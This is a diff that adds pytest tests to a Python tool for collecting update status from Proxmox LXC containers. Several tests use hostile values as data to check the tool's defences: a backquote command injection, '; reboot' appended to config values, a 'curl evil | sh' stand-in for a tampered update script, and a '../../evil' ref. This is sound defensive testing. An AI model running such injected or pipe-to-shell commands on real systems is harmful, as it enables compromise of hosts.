@@ -30,6 +30,21 @@ def test_version_helpers():
     assert c.parse_version("v1.37.3") == "1.37.3"
     assert c.parse_version("no version here") is None
     assert c.version_key("1.10.0") > c.version_key("1.9.9")
+
+
+@pytest.mark.parametrize("latest, installed, newer", [
+    ("1.2.0", "1.2", False),          # same version, written differently
+    ("1.2", "1.2.0", False),
+    ("v1.3", "1.2.9", True),
+    ("2.0.0", "2.0.0-rc1", True),     # the release follows its release candidate
+    ("2.0.0-rc2", "2.0.0-rc1", True),
+    ("2.0.0-rc1", "2.0.0", False),
+    ("1.2.3-2", "1.2.3-1", True),     # packaging revision
+    ("1.2.3", "1.2.4", False),        # never "update" to an older version
+    ("abc", "def", True),             # not comparable: any difference counts
+])
+def test_is_newer(latest, installed, newer):
+    assert c.is_newer(latest, installed) is newer
     assert c.strip_v("v1.2") == "1.2" and c.strip_v("verbose") == "verbose"
 
 
@@ -66,7 +81,8 @@ def helper_script_env(monkeypatch):
 
 def fake_container(files):
     def pct_exec(ctid, script, timeout=120):
-        wanted = script.split("for f in ", 1)[1].split(";", 1)[0].split()
+        import shlex
+        wanted = shlex.split(script.split("for f in ", 1)[1].split("; do", 1)[0])
         return 0, "\n".join(f"{path}\t{files[path]}" for path in wanted if path in files)
     return pct_exec
 
@@ -400,7 +416,7 @@ def chain_env(monkeypatch, fail=(), inventory=INVENTORY):
     """Fake the host: containers 101 and 102 run, every command goes through stream_process and is recorded."""
     commands = docker_env(monkeypatch, inventory=inventory, fail=fail)
     monkeypatch.setattr(c, "list_containers", lambda: [("101", "running", "a"), ("102", "running", "b")])
-    monkeypatch.setattr(c, "fetch_update_apps_script", lambda: "echo update")
+    monkeypatch.setattr(c, "fetch_update_apps_script", lambda ref="main": "echo update")
     monkeypatch.setattr(c, "pct_exec", lambda ctid, script, timeout=120: (0, inventory))
     return commands
 
@@ -590,11 +606,225 @@ def test_every_request_to_the_service_announces_the_collector_version(monkeypatc
         def read(self, *args):
             return b"{}"
 
-    monkeypatch.setattr(c.urllib.request, "urlopen", lambda req, timeout=None: seen.append(dict(req.header_items())) or Reply())
+    monkeypatch.setattr(c.urllib.request, "urlopen", lambda req, timeout=None, context=None: seen.append(dict(req.header_items())) or Reply())
     c.server_call({"server_url": "http://x", "token": "t"}, "GET", "/api/jobs/pending")
     assert seen[0]["X-collector-version"] == c.VERSION and seen[0]["Authorization"] == "Bearer t"
 
 
+# ---------------------------------------------------------------- the report
+
+def test_the_report_is_sent_like_every_other_request(monkeypatch, tmp_path, capsys):
+    config = tmp_path / "config.json"
+    config.write_text('{"server_url": "http://x", "token": "t"}', encoding="utf-8")
+    calls = []
+    monkeypatch.setattr(c, "CONFIG_PATH", str(config))
+    monkeypatch.setattr(c, "run", lambda cmd, timeout=120: (0, ""))           # pct found, no container
+    monkeypatch.setattr(c, "list_containers", lambda: [])
+    monkeypatch.setattr(c, "host_updates", lambda: {"count": 0, "packages": [], "kernel": False})
+    monkeypatch.setattr(c, "ProgressReporter", lambda config, run_id: type("P", (), {
+        "event": lambda self, **f: None, "close": lambda self: None})())
+    monkeypatch.setattr(c, "server_call", lambda config, method, path, body=None, timeout=15: calls.append(path) or {})
+    monkeypatch.setattr(c.sys, "argv", ["lxc_collect.py"])
+    c.main()
+    assert calls == ["/api/report"] and "Report sent: 0 container(s)." in capsys.readouterr().out
+
+
+def test_a_report_that_cannot_be_sent_ends_with_an_error(monkeypatch, tmp_path):
+    config = tmp_path / "config.json"
+    config.write_text('{"server_url": "http://x", "token": "t"}', encoding="utf-8")
+    monkeypatch.setattr(c, "CONFIG_PATH", str(config))
+    monkeypatch.setattr(c, "run", lambda cmd, timeout=120: (0, ""))
+    monkeypatch.setattr(c, "list_containers", lambda: [])
+    monkeypatch.setattr(c, "host_updates", lambda: {"count": 0, "packages": [], "kernel": False})
+    monkeypatch.setattr(c, "ProgressReporter", lambda config, run_id: type("P", (), {
+        "event": lambda self, **f: None, "close": lambda self: None})())
+
+    def refused(*a, **k):
+        raise c.urllib.error.HTTPError("http://x/api/report", 401, "invalid token", {}, None)
+
+    monkeypatch.setattr(c, "server_call", refused)
+    monkeypatch.setattr(c.sys, "argv", ["lxc_collect.py"])
+    with pytest.raises(SystemExit, match="Could not send the report"):
+        c.main()
+# ---------------------------------------------------------------- values put into container shell commands
+
+@pytest.mark.skipif(__import__("shutil").which("sh") is None or __import__("shutil").which("id") is None,
+                    reason="needs a POSIX shell")
+def test_names_from_a_downloaded_script_cannot_run_commands(monkeypatch, tmp_path):
+    import subprocess
+    scripts = []
+    monkeypatch.setattr(c, "script_index", lambda config, cache: {"evil": [("ct", "evil", "ct/evil.sh")]})
+    monkeypatch.setattr(c, "cached_fetch", lambda *a, **k: 'check_for_gh_release "x`>pwned`" "o/r"')
+    monkeypatch.setattr(c, "pct_exec", lambda ctid, script, timeout=120: scripts.append(script) or (0, ""))
+    assert c.auto_app_status("1", "evil", {}, {}) is None
+    subprocess.run(["sh", "-c", scripts[0]], cwd=tmp_path, capture_output=True)
+    assert not (tmp_path / "pwned").exists()     # unquoted, the backquotes would have created this file
+
+
+def test_config_values_are_quoted_in_container_commands(monkeypatch):
+    scripts = []
+    monkeypatch.setattr(c, "pct_exec", lambda ctid, script, timeout=120: scripts.append(script) or (0, ""))
+    c.app_status("1", {"version_file": "/opt/my app/VERSION; reboot"}, "", {})
+    c.apt_app_status("1", {"apt_package": "pkg; reboot"}, [])
+    assert scripts[0] == "cat '/opt/my app/VERSION; reboot'"
+    assert "'pkg; reboot'" in scripts[1]
+# ---------------------------------------------------------------- the official update script
+
+def test_the_official_script_is_named_with_its_version_and_hash(monkeypatch):
+    import hashlib
+    urls = []
+    monkeypatch.setattr(c, "cached_fetch", lambda url, ttl, token=None: urls.append(url) or "echo update")
+    digest = hashlib.sha256(b"echo update").hexdigest()
+    shipper = Shipper()
+    assert c.official_update_script({}, shipper) == "echo update"
+    assert "/main/tools/pve/update-apps.sh" in urls[0] and f"at main, sha256 {digest}" in shipper.text
+    assert c.official_update_script({"scripts_ref": "a1b2c3d", "update_apps_sha256": digest.upper()}, Shipper())
+    assert "/a1b2c3d/tools/pve/update-apps.sh" in urls[1]
+
+
+def test_an_official_script_that_changed_or_a_bad_ref_is_refused(monkeypatch):
+    monkeypatch.setattr(c, "cached_fetch", lambda url, ttl, token=None: "curl evil | sh")
+    shipper = Shipper()
+    assert c.official_update_script({"update_apps_sha256": "0" * 64}, shipper) is None and "Refused" in shipper.text
+    assert c.official_update_script({"scripts_ref": "../../evil"}, Shipper()) is None
+    monkeypatch.setattr(c, "list_containers", lambda: [("100", "running", "a")])
+    results = c.update_apps({"ctids": [100]}, {"update_apps_sha256": "0" * 64}, Shipper())
+    assert results == [{"label": "update-apps.sh", "ok": False, "message": c.SCRIPT_UNAVAILABLE}]
+# ---------------------------------------------------------------- TLS to the web service
+
+def test_the_service_certificate_can_come_from_a_private_ca(monkeypatch):
+    seen = []
+    monkeypatch.setattr(c.ssl, "create_default_context", lambda cafile=None: seen.append(cafile) or "ctx")
+    assert c.server_tls({"server_url": "https://lxc.lan"}) is None          # public CA: the default context
+    assert c.server_tls({"server_ca_file": "/etc/lxcw-ca.pem"}) == "ctx" and seen == ["/etc/lxcw-ca.pem"]
+
+
+def test_server_calls_use_the_tls_context(monkeypatch):
+    contexts = []
+
+    class Reply:
+        def __enter__(self):
+            return self
+
+        def __exit__(self, *exc):
+            return False
+
+        def read(self, *args):
+            return b"{}"
+
+    monkeypatch.setattr(c, "server_tls", lambda config: "ctx")
+    monkeypatch.setattr(c.urllib.request, "urlopen", lambda req, timeout=None, context=None: contexts.append(context) or Reply())
+    c.server_call({"server_url": "https://x", "token": "t"}, "GET", "/api/jobs/pending")
+    assert contexts == ["ctx"]
+# ---------------------------------------------------------------- time limits inside the containers
+
+def test_commands_in_a_container_carry_their_own_time_limit():
+    cmd = c.in_container(101, ["docker", "image", "prune", "-f"], 900)
+    assert cmd[:7] == ["pct", "exec", "101", "--", "sh", "-c", c.TIMEOUT_GUARD]
+    assert cmd[7:] == ["900", "docker", "image", "prune", "-f"]
+
+
+@pytest.mark.skipif(__import__("shutil").which("sh") is None or __import__("shutil").which("timeout") is None,
+                    reason="needs a POSIX shell with timeout")
+def test_the_timeout_guard_stops_the_command_and_keeps_exit_codes():
+    import subprocess
+    guard = ["sh", "-c", c.TIMEOUT_GUARD]
+    assert subprocess.run(guard + ["1", "sh", "-c", "sleep 5"]).returncode == 124
+    assert subprocess.run(guard + ["5", "sh", "-c", "exit 3"]).returncode == 3
+    out = subprocess.run(guard + ["5", "sh", "-c", "echo \"$1\"", "sh", "a b"], capture_output=True, text=True)
+    assert out.stdout == "a b\n"
+# ---------------------------------------------------------------- Docker images
+
+def test_docker_list_reads_the_image_each_container_really_runs():
+    # The name comes from the container's config and the digests from the image ID it runs, not from the tag,
+    # which may already point to a newer image pulled but not yet used.
+    assert "{{.Config.Image}}|{{.Image}}" in c.DOCKER_LIST_SCRIPT
+    assert '"$imgid"' in c.DOCKER_LIST_SCRIPT and "docker ps --format" not in c.DOCKER_LIST_SCRIPT
+
+
+def test_an_image_pulled_again_but_not_restarted_is_an_update(monkeypatch):
+    old = "sha256:" + "a" * 64
+    new = "sha256:" + "b" * 64
+    monkeypatch.setattr(c, "pct_exec", lambda *a, **k: (0, f'nginx:latest\t["nginx@{old}"]'))
+    monkeypatch.setattr(c, "registry_digest", lambda registry, repo, tag, auth, cache: new)
+    assert c.docker_status("1", {}, {}) == [{"image": "nginx:latest", "update": True}]
+# ---------------------------------------------------------------- console output of the jobs
+
+def log_shipper(monkeypatch, outcome):
+    sent = []
+
+    def fake_call(config, method, path, body=None, timeout=15):
+        if outcome:
+            raise outcome[0]
+        sent.append(body["text"])
+
+    monkeypatch.setattr(c, "server_call", fake_call)
+    shipper = c.LogShipper({}, "j")
+    shipper.stop.set()            # no background flush: the test drives it
+    shipper.thread.join()
+    return shipper, sent
+
+
+def test_log_shipper_keeps_the_output_while_the_service_is_down(monkeypatch):
+    outcome = [OSError("down")]
+    shipper, sent = log_shipper(monkeypatch, outcome)
+    shipper.write("one\n")
+    shipper._flush()
+    shipper.write("two\n")
+    outcome.clear()
+    shipper._flush()
+    assert sent == ["one\ntwo\n"]
+
+
+def test_log_shipper_memory_is_bounded(monkeypatch):
+    shipper, _ = log_shipper(monkeypatch, [OSError("down")])
+    monkeypatch.setattr(c.LogShipper, "MAX_PENDING_CHARS", 200)
+    for i in range(50):
+        shipper.write(f"line {i:03}\n")
+        shipper._flush()
+    waiting = "".join(shipper.pending)
+    assert len(waiting) <= 200 and "dropped" in waiting and waiting.endswith("line 049\n")
+
+
+def test_log_shipper_drops_output_of_a_job_the_service_forgot(monkeypatch):
+    gone = c.urllib.error.HTTPError("http://x", 404, "unknown job", {}, None)
+    shipper, _ = log_shipper(monkeypatch, [gone])
+    shipper.write("late\n")
+    shipper._flush()
+    assert shipper.pending == []
+# ---------------------------------------------------------------- one container must not break the others
+
+def test_a_container_whose_check_crashes_does_not_stop_the_report(monkeypatch, capsys):
+    def collect(entry, config, cache, progress=None):
+        if entry[0] == "101":
+            raise ValueError("bad version_regex")
+        return {"ctid": int(entry[0]), "name": entry[2], "status": "running", "os_updates": 0}
+
+    events = []
+
+    class Progress:
+        def event(self, **fields):
+            events.append(fields)
+
+    monkeypatch.setattr(c, "collect_one", collect)
+    assert c.safe_collect_one(("100", "running", "a"), {}, {})["os_updates"] == 0
+    broken = c.safe_collect_one(("101", "running", "b"), {}, {}, Progress())
+    assert broken["ctid"] == 101 and broken["os_updates"] is None and "bad version_regex" in broken["error"]
+    assert {(e["step"], e["state"]) for e in events} == {("system", "done"), ("app", "done"), ("docker", "done")}
+    assert "CT 101: check failed" in capsys.readouterr().err
+
+
+def test_an_exception_in_one_container_keeps_the_results_of_the_others():
+    shipper = Shipper()
+
+    def work(item):
+        if item[0] == 2:
+            raise RuntimeError("boom")
+        return {"label": f"CT {item[0]} {item[1]}", "ok": True, "message": ""}
+
+    results = c.map_containers(work, [(1, "a"), (2, "b"), (3, "c")], 2, shipper)
+    assert [r["ok"] for r in results] == [True, False, True]
+    assert results[1]["message"] == "internal error: boom" and "[CT 2]" in shipper.text and "finished: failed" in shipper.text
 # ---------------------------------------------------------------- GitHub API
 
 class FakeResponse:
